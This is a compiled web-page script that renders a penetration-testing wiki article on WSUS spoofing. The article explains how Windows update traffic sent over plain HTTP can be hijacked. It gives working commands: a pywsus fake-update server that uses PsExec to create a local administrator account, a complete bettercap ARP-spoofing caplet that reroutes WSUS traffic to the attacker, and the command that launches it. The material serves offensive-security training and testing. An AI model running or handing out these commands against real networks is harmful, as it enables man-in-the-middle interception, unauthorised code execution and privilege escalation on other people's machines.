import{_ as a,c as e,a5 as i,o as t}from"./chunks/framework.B5CpDqM0.js";const k=JSON.parse('{"title":"WSUS spoofing","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/wsus-spoofing.md","filePath":"ad/movement/mitm-and-coerced-authentications/wsus-spoofing.md","lastUpdated":1724982529000}'),n={name:"ad/movement/mitm-and-coerced-authentications/wsus-spoofing.md"};function r(o,s,p,l,h,d){return t(),e("div",null,s[0]||(s[0]=[i(`<h1 id="wsus-spoofing" tabindex="-1">WSUS spoofing <a class="header-anchor" href="#wsus-spoofing" aria-label="Permalink to &quot;WSUS spoofing&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>WSUS (Windows Server Update Services) allow administrators to centralize the management and deployment of Windows updates within their organization network. When first configuring this set of services, the default configuration makes the WSUS use HTTP without any secure layer like SSL/TLS. HTTPS is not enforced by default.</p><p>When pulling an update from the WSUS server, clients are redirected to the executable file to download and execute (which can only be a binary signed by Microsoft) and obtain a handler named <code>CommandLineInstallation</code> that specifies the additional parameters to pass the binary during the update installation. Without HTTPS, the WSUS is vulnerable to Man-in-the-Middle attacks where adversaries can either pose as the update server and send malicious updates or intercept and modify updates sent to the clients.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>The following command prints the WSUS server the client requests when searching for an update. If the path looks like <code>http://wsus.domain.local/</code>, showing the use of HTTP instead of HTTPS, the attacks can be attempted.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v wuserver</span></span></code></pre></div><p>The WSUS spoofing attack can be conducted as follows</p><ol><li>Obtain a Man-in-the-Middle position between clients and the update server with <a href="./arp-poisoning">ARP poisoning</a>.</li><li>Redirect traffic from <code>clients -&gt; legitimate WSUS</code> to <code>clients -&gt; attacker&#39;s WSUS</code></li><li>Have a custom WSUS server running able to send evil updates to clients</li></ol><p>In a scenario where the clients and the attacker are on the same subnet, and the update server is on another one, the steps below can be followed. For other scenarios or more info on ARP poisoning, a recipe exists for it.</p><div class="tip custom-block"><p>Read the <a href="./arp-poisoning">arp-poisoning.md</a> article for more insight</p></div><h3 id="preparing-the-evil-wsus" tabindex="-1">Preparing the evil WSUS <a class="header-anchor" href="#preparing-the-evil-wsus" aria-label="Permalink to &quot;Preparing the evil WSUS&quot;">​</a></h3><p>The evil WSUS server needs to be started before doing any ARP poisoning. The <a href="https://github.com/GoSecure/pywsus" target="_blank" rel="noreferrer">pywsus </a>(Python) utility can be used for that matter.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> pywsus.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --host</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $network_facing_ip </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--port</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8530</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --executable</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /path/to/PsExec64.exe</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --command</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;/accepteula /s cmd.exe /c &quot;net user testuser somepassword /add &amp;&amp; net localgroup Administrators testuser /add&quot;&#39;</span></span></code></pre></div><p>Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called <a href="./../../../infra/privilege-escalation/windows/living-off-the-land">Living off the land</a> (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on <a href="https://lolbas-project.github.io" target="_blank" rel="noreferrer">lolbas-project.github.io</a>.</p><h3 id="poisoning-and-hijacking" tabindex="-1">Poisoning and hijacking <a class="header-anchor" href="#poisoning-and-hijacking" aria-label="Permalink to &quot;Poisoning and hijacking&quot;">​</a></h3><p>Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is <a href="https://www.bettercap.org/" target="_blank" rel="noreferrer">bettercap</a> (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.</p><p>Packets from the client to the WSUS server need to be hijacked and sent to the attacker&#39;s evil WSUS server. In order to do so, the attacker must pose as the client&#39;s gateway, route all traffic to the real gateway except the packets destined to the WSUS server.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># quick recon of the network</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">net.probe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># set the ARP spoofing</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> arp.spoof.targets</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $client_ip</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> arp.spoof.internal</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> false</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> arp.spoof.fullduplex</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> false</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># reroute traffic aimed at the WSUS server</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> any.proxy.iface</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $interface</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> any.proxy.protocol</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TCP</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> any.proxy.src_address</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $WSUS_server_ip</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> any.proxy.src_port</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8530</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> any.proxy.dst_address</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $attacker_ip</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> any.proxy.dst_port</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8530</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># control logging and verbosity</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">events.ignore</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> endpoint</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">events.ignore</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> net.sniff</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># start the modules</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">any.proxy</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">arp.spoof</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">net.sniff</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span></code></pre></div><p>The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">bettercap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --iface</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $interface </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--caplet</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> wsus_spoofing.cap</span></span></code></pre></div><h3 id="triggering-windows-update" tabindex="-1">Triggering Windows update <a class="header-anchor" href="#triggering-windows-update" aria-label="Permalink to &quot;Triggering Windows update&quot;">​</a></h3><p>The search for Windows updates can be manually triggered when having access to the target computer by going to <code>Settings &gt; Update &amp; Security &gt; Windows Update &gt; Check for updates</code>.</p><div class="tip custom-block"><p>By default, the automatic updates interval is 22 hours (<a href="https://docs.microsoft.com/en-us/windows/deployment/update/waas-wu-settings" target="_blank" rel="noreferrer">source</a>).</p></div><h2 id="alternative-attack" tabindex="-1">Alternative attack <a class="header-anchor" href="#alternative-attack" aria-label="Permalink to &quot;Alternative attack&quot;">​</a></h2><p>Another way of attacking insecure WSUS without having to rely on ARP poisoning but requiring user access to the target machine is explained in the following blogpost : <a href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/" target="_blank" rel="noreferrer">WSUS Attacks Part 2: CVE-2020-1013 a Windows 10 Local Privilege Escalation 1-Day</a></p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/" target="_blank" rel="noreferrer">https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/</a></p>`,28)]))}const g=a(n,[["render",r]]);export{k as __pageData,g as default};
